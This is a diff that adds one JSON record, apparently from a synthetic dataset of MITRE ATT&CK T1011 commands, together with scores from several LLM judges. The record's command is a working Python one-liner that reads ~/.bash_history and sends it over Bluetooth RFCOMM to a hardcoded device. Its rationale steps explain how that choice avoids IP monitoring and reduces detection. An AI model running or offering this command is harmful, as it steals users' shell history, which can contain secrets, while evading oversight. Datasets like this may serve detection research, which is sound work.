@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Uses Bluetooth RFCOMM channel 27 to move shell history data outside the normal IP stack, consistent with T1011 exfiltration over other network mediums.",
+  "rationale_steps": [
+    "Choose Bluetooth (RFCOMM) to avoid IP-based monitoring.",
+    "Connect to an uncommon RFCOMM channel (27) to reduce detection.",
+    "Read and send ~/.bash_history over the RFCOMM socket.",
+    "Terminate connection cleanly to leave minimal indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-dde69e91",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The shell quoting is balanced and the inline Python uses valid socket APIs and syntax, making it fully parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It attempts to exfiltrate ~/.bash_history over Bluetooth RFCOMM as claimed, but depends on platform support, pairing/listener availability, and lacks reliability features like retries or encryption.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:00:35.450669Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced quotes, parentheses, and proper syntax for socket creation, connection, file reading, and data transmission.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using Python to read the user's bash history file and transmit it over Bluetooth RFCOMM protocol to a specific device, bypassing traditional network monitoring.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:00:38.677303Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, uses correct syntax for imports, socket creation, connection, file operations, and method calls, with all quotes and parentheses balanced.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using an automated Python script to exfiltrate collected `.bash_history` data over an alternative network medium (Bluetooth RFCOMM) outside the normal IP stack, which aligns precisely with T1011's description of automated exfiltration over alternative protocols.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:37:18.531171Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
